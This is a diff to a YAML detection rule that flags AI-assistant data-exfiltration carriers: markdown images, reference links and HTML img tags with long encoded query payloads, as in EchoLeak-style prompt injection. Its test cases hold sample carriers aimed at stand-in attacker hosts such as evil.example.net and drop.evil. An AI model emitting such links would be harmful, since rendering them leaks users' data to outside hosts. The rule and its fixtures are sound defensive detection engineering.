@@ -1,7 +1,7 @@
 schema: testpattern/v1
 name: AI Data-Exfiltration Marker
 slug: ai-data-exfiltration-marker
-version: 0.4.1
+version: 0.5.0
 type: regex
 pattern_class: identifier
 engine: universal
@@ -13,8 +13,9 @@ description: >-
 operation: >-
   Three regexes: markdown image with external host + data-like query payload (>=16 chars),
   reference-style markdown link definition off-tenant, and an external <img src>. Corroborated by
-  AI-context markers. Filters exclude allow-listed corporate hosts and obvious test text. Three tiers
-  (65 regex only; 75 + AI context; 85 + AI context with corporate-host exclusion).
+  AI-context markers. Filters exclude allow-listed corporate hosts and obvious test text. Tiers:
+  65 regex-only carriers are discovery-only; 75 requires AI context (all three carriers); 85 adds
+  the corporate-host exclusion for the markdown-image carrier.
 pattern: '!\[[^\]]*\]\(\s*https?://[^)\s]+[?#&][^)\s]*=[^)\s]{16,}\)'
 confidence: high
 confidence_justification: >-
@@ -61,11 +62,22 @@ purview:
       id_match: Regex_md_image_exfil
       matches:
         - ref: Evidence_ai_context
+    - confidence_level: 75
+      id_match: Regex_md_reflink_exfil
+      matches:
+        - ref: Evidence_ai_context
+    - confidence_level: 75
+      id_match: Regex_html_img_exfil
+      matches:
+        - ref: Evidence_ai_context
     - confidence_level: 65
+      discovery_only: true
       id_match: Regex_md_image_exfil
     - confidence_level: 65
+      discovery_only: true
       id_match: Regex_md_reflink_exfil
     - confidence_level: 65
+      discovery_only: true
       id_match: Regex_html_img_exfil
   keywords:
     - id: Keyword_corporate_hosts
@@ -92,6 +104,8 @@ test_cases:
   should_match:
     - value: '![logo](https://evil.example.net/c?d=eyJzZWNyZXQiOiJsZWFrZWQtdmFsdWUtMTIzNDU2Nzg5In0)'
       description: Markdown image to external host with long base64-like query payload
+    - value: 'Copilot completion: ![x](https://drop.evil/p?blob=QWxhZGRpbjpvcGVuIHNlc2FtZQ==)'
+      description: AI-context marker plus unapproved-host carrier with long encoded payload (enforces at 75)
     - value: '<img src="https://attacker.test/p?x=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo">'
       description: HTML img tag to external host with encoded payload
     - value: '[ref]: https://evil.example.net/c?d=eyJzZWNyZXQiOiJsZWFrZWQtdmFsdWUtMTIzNDU2Nzg5In0'
@@ -101,14 +115,25 @@ test_cases:
       description: SharePoint deep link (corporate host, no data payload)
     - value: '![pixel](https://analytics.example.com/t?id=42)'
       description: Analytics URL with short, non-data parameter
+    - value: '![build](https://contoso.sharepoint.com/render?sig=0123456789abcdef0123456789abcdef)'
+      description: Long signed query on an approved corporate host with no AI context — discovery only, must not enforce
+    - value: 'Quarterly sales report: regional revenue increased 8 percent; no links or embedded images are included.'
+      description: Ordinary business prose with no outbound markdown/HTML carrier
+    - value: 'Copilot rendered ![x](https://evil.test/p?d=123456789012345)'
+      description: Fifteen payload characters remain below the authored 16-character floor
+    - value: 'Training example for EchoLeak: ![x](https://evil.test/p?d=0123456789abcdef)'
+      description: Quoted training carrier with no AI-context marker — discovery only, must not enforce
 false_positives:
   - description: Legitimate markdown images or links to external CDNs or documentation hosts that carry long cache-busting or signed-URL query strings (e.g. AWS presigned URLs, CDN asset hashes) resembling encoded payloads.
     mitigation: Maintain an allow-list of trusted asset/CDN hosts (extend Keyword_corporate_hosts) and require AI-context corroboration before raising confidence; the 65 regex-only tier is advisory.
   - description: Security-research, training, or detection-engineering content that quotes EchoLeak-style exfiltration carriers verbatim as examples.
     mitigation: Exclude documents containing example/test markers (example.com, PLACEHOLDER) via the existing TextMatchFilter and gate on AI-context markers absent in prose discussion.
 created: '2026-06-08'
-updated: '2026-07-14'
+updated: '2026-07-16'
 changelog:
+  - version: 0.5.0
+    date: '2026-07-16'
+    description: 'SIT alignment wave1 (TP-00006, reduced scope): the three bare regex-only 65 carrier tiers are now discovery_only (host-agnostic syntax alone cannot prove off-tenant exfiltration); added 75 tiers gated on Evidence_ai_context for the reference-link and HTML-img carriers to mirror the markdown-image tier; adversarial test cases added. Approved-host dictionary extension and a dedicated training exclusion were reviewed and deliberately NOT added (parked pending tenant host policy).'
   - version: 0.4.1
     date: '2026-07-14'
     description: 'v23 reviewed risk assessment: apply the individually reviewed workbook outcome from row 1507 without changing detector or package metadata.'
